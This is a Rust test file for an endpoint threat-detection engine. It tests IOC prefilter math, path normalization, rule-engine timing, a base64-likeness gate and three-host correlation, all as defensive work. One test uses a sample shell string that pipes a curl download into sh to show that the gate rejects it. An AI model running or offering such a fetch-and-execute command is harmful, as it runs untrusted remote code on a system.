use crate::layer1::{
    base64ish_alphabet_ratio, cuckoo_false_positive_rate, normalize_for_matching,
    passes_optional_alphabet_ratio_gate, should_rebuild_prefilter, IocLayer1,
    PREFILTER_MAX_LOAD_FACTOR,
};
use crate::*;
use std::time::{Duration, Instant};

fn event(ts: i64, class: EventClass) -> TelemetryEvent {
    TelemetryEvent {
        ts_unix: ts,
        event_class: class,
        pid: 7,
        ppid: 1,
        uid: 1000,
        process: "bash".to_string(),
        parent_process: "sshd".to_string(),
        file_path: None,
        file_hash: None,
        dst_port: Some(9001),
        dst_ip: None,
        dst_domain: None,
        command_line: None,
    }
}

fn one_stage_rule(name: &str, class: EventClass) -> TemporalRule {
    TemporalRule {
        name: name.to_string(),
        stages: vec![TemporalStage {
            predicate: TemporalPredicate {
                event_class: class,
                process_any_of: None,
                parent_any_of: None,
                uid_eq: None,
                uid_ne: None,
                dst_port_not_in: None,
            },
            within_secs: 15,
        }],
    }
}

fn run_observe_batch(
    engine: &mut TemporalEngine,
    event: &TelemetryEvent,
    iterations: usize,
) -> Duration {
    let start = Instant::now();
    for _ in 0..iterations {
        std::hint::black_box(engine.observe(event));
    }
    start.elapsed()
}

fn average_observe_ns(engine: &mut TemporalEngine, event: &TelemetryEvent) -> f64 {
    let min_duration = Duration::from_millis(5);
    let mut warmup_iterations: usize = 64;

    // Warm up allocator and branch predictors before timing.
    while run_observe_batch(engine, event, warmup_iterations) < min_duration {
        warmup_iterations = warmup_iterations
            .checked_mul(2)
            .expect("warm-up iteration overflow");
    }

    let mut iterations = warmup_iterations;
    let mut samples_ns = [0.0_f64; 5];

    for sample in &mut samples_ns {
        loop {
            let elapsed = run_observe_batch(engine, event, iterations);
            if elapsed >= min_duration {
                *sample = elapsed.as_nanos() as f64 / iterations as f64;
                break;
            }
            iterations = iterations
                .checked_mul(2)
                .expect("measurement iteration overflow");
        }
    }

    samples_ns.sort_by(|a, b| a.partial_cmp(b).unwrap());
    samples_ns[samples_ns.len() / 2]
}

#[test]
// AC-DET-004
fn cuckoo_false_positive_formula_matches_reference_values() {
    let b = 4u32;
    let f12 = cuckoo_false_positive_rate(b, 12);
    let f16 = cuckoo_false_positive_rate(b, 16);
    let f18 = cuckoo_false_positive_rate(b, 18);
    let f20 = cuckoo_false_positive_rate(b, 20);

    assert!((f12 - 1.953125e-3).abs() < 1e-9);
    assert!((f16 - 1.220703125e-4).abs() < 1e-10);
    assert!((f18 - 3.0517578125e-5).abs() < 1e-11);
    assert!((f20 - 7.62939453125e-6).abs() < 1e-12);
}

#[test]
// AC-DET-005
fn prefilter_policy_rebuilds_on_high_load_or_insertion_failure_signal() {
    assert!(should_rebuild_prefilter(
        PREFILTER_MAX_LOAD_FACTOR + 0.001,
        false
    ));
    assert!(should_rebuild_prefilter(0.50, true));
    assert!(!should_rebuild_prefilter(
        PREFILTER_MAX_LOAD_FACTOR - 0.10,
        false
    ));

    let mut l1 = IocLayer1::new();
    let values: Vec<String> = (0..20_000).map(|i| format!("hash-{i:05x}")).collect();
    l1.load_hashes(values);

    let (hash_load, _, _) = l1.debug_prefilter_load_factors();
    assert!(hash_load <= PREFILTER_MAX_LOAD_FACTOR);
    let _ = l1.debug_prefilter_rebuilds();
}

#[test]
// AC-DET-012 AC-DET-013
fn normalization_policy_is_fixed_for_casefolding_and_path_canonicalization() {
    let windows = r"C:\Users\ADMIN\Desktop\Dropper.EXE";
    let unix = "c:/users/admin/desktop/dropper.exe";
    let normalized_windows = normalize_for_matching(windows);
    let normalized_unix = normalize_for_matching(unix);
    assert_eq!(normalized_windows, normalized_unix);

    let mut l1 = IocLayer1::new();
    l1.load_string_signatures([windows.to_string()]);

    let hits_from_unix = l1.check_text(unix);
    assert!(hits_from_unix.iter().any(|h| h == &normalized_unix));
}

#[test]
// AC-DET-025
fn temporal_runtime_cost_scales_with_subscribed_rule_count() {
    let mut low = TemporalEngine::new();
    for i in 0..32 {
        low.add_rule(one_stage_rule(
            &format!("proc-{i}"),
            EventClass::ProcessExec,
        ));
    }
    for i in 0..4_096 {
        low.add_rule(one_stage_rule(&format!("dns-{i}"), EventClass::DnsQuery));
    }

    let mut high = TemporalEngine::new();
    for i in 0..1024 {
        high.add_rule(one_stage_rule(
            &format!("proc-hi-{i}"),
            EventClass::ProcessExec,
        ));
    }
    for i in 0..4_096 {
        high.add_rule(one_stage_rule(&format!("dns-hi-{i}"), EventClass::DnsQuery));
    }

    let e = event(10, EventClass::ProcessExec);
    let elapsed_low = average_observe_ns(&mut low, &e);
    let elapsed_high = average_observe_ns(&mut high, &e);

    let ratio = elapsed_high / elapsed_low;
    assert!(
        ratio > 2.0,
        "expected higher cost with more subscribed rules, got {ratio}"
    );
    assert!(ratio < 80.0, "unexpected superlinear blow-up, got {ratio}");
}

#[test]
// AC-DET-043
fn optional_alphabet_ratio_gate_accepts_only_base64_like_payloads_when_enabled() {
    let base64_like = "QWxhZGRpbjpPcGVuU2VzYW1lL0ErPS0_";
    let shell_like = "bash -lc 'curl https://x|sh'";

    assert!(passes_optional_alphabet_ratio_gate(base64_like, None));
    assert!(passes_optional_alphabet_ratio_gate(base64_like, Some(0.90)));
    assert!(!passes_optional_alphabet_ratio_gate(shell_like, Some(0.90)));

    let base_ratio = base64ish_alphabet_ratio(base64_like);
    let shell_ratio = base64ish_alphabet_ratio(shell_like);
    assert!(base_ratio > shell_ratio);
}

#[test]
// AC-DET-130 AC-DET-131 AC-DET-132
fn cross_agent_correlation_is_advisory_only_and_requires_three_hosts() {
    let signals = vec![
        CorrelationSignal {
            host_id: "h1".to_string(),
            ioc: "deadbeef".to_string(),
        },
        CorrelationSignal {
            host_id: "h2".to_string(),
            ioc: "deadbeef".to_string(),
        },
        CorrelationSignal {
            host_id: "h3".to_string(),
            ioc: "deadbeef".to_string(),
        },
        CorrelationSignal {
            host_id: "h9".to_string(),
            ioc: "other".to_string(),
        },
    ];

    let incidents = correlate_cross_agent_iocs(&signals);
    assert_eq!(incidents.len(), 1);
    let incident = &incidents[0];
    assert_eq!(incident.ioc, "deadbeef");
    assert_eq!(incident.host_count, 3);
    assert_eq!(incident.hosts, vec!["h1", "h2", "h3"]);
    assert!(incident.advisory_only);
}

#[test]
// AC-DET-130 AC-DET-131 AC-DET-132 AC-VER-044
fn cross_agent_correlation_does_not_trigger_below_three_hosts() {
    let signals = vec![
        CorrelationSignal {
            host_id: "h1".to_string(),
            ioc: "deadbeef".to_string(),
        },
        CorrelationSignal {
            host_id: "h2".to_string(),
            ioc: "deadbeef".to_string(),
        },
    ];

    let incidents = correlate_cross_agent_iocs(&signals);
    assert!(incidents.is_empty());
}
